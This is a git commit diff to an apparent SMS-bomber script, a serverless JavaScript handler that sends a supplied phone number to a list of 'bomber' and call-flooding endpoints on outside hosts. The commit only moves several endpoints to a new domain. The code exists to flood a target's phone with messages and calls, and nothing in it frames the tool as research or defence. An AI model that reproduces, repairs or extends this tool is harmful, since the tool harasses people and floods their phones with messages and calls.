9ae7eaca90140c6555c8d40ef06134779c675054
darkboy7024 <12magirdalal3@gmail.com>
2025-07-17 11:27:34 -0500

    Update smsbomberv1330.js

--- api/smsbomberv1330.js
+++ api/smsbomberv1330.js
@@ -13,12 +13,12 @@ export default async function handler(req, res) {
 
     // API endpoints
     const apis = [
-        `https://bomber-24house.vercel.app/api/bomber1?phone=${phone}`,
-        `https://bomber-24house.vercel.app/api/bomber2?phone=${phone}`,
-        `https://bomber-24house.vercel.app/api/bomber4?phone=${phone}`,
+        `https://bomber-24.vercel.app/api/bomber1?phone=${phone}`,
+        `https://bomber-24.vercel.app/api/bomber2?phone=${phone}`,
+        `https://bomber-24.vercel.app/api/bomber4?phone=${phone}`,
         `http://mrn-bio.social-networking.me/cobraCll.php?num=${phone}`,
         `https://yousuf323215.serv00.net/call90.php?number=${phone}`,
-       `https://bomber-24house.vercel.app/api/bomber3?phone=${phone}` // Added API
+       `https://bomber-24.vercel.app//api/bomber3?phone=${phone}` // Added API
     ];
 
     let successCount = 0;
